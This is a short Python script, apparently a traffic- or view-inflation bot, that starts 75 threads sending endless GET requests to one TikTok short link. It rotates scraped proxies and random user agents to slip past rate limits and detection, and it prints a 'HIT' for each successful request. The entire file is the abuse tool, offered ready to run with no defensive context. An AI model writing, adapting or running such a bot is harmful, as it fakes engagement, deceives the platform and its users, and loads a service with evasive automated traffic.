import requests, random, threading, time
from proxy_hunter import scrape_fresh_proxies
from agents import user_agents

TARGET = "https://vm.tiktok.com/ZNd3Q8Bsx/"

class TikTokNuke:
    def __init__(self):
        self.proxies = scrape_fresh_proxies()
        
    def assault_wave(self):
        while True:
            try:
                proxy = {"http": f"http://{random.choice(self.proxies)}"}
                headers = {"User-Agent": random.choice(user_agents)}
                response = requests.get(TARGET, headers=headers, proxies=proxy, timeout=15)
                if response.status_code == 200:
                    print(f"💥 HIT via {proxy['http'][:20]}...")
            except:
                pass
            time.sleep(random.uniform(1, 3))
    
    def launch_assault(self, thread_count=75):
        for i in range(thread_count):
            threading.Thread(target=self.assault_wave, daemon=True).start()

nuke = TikTokNuke()
nuke.launch_assault(75)

while True:
    time.sleep(1)
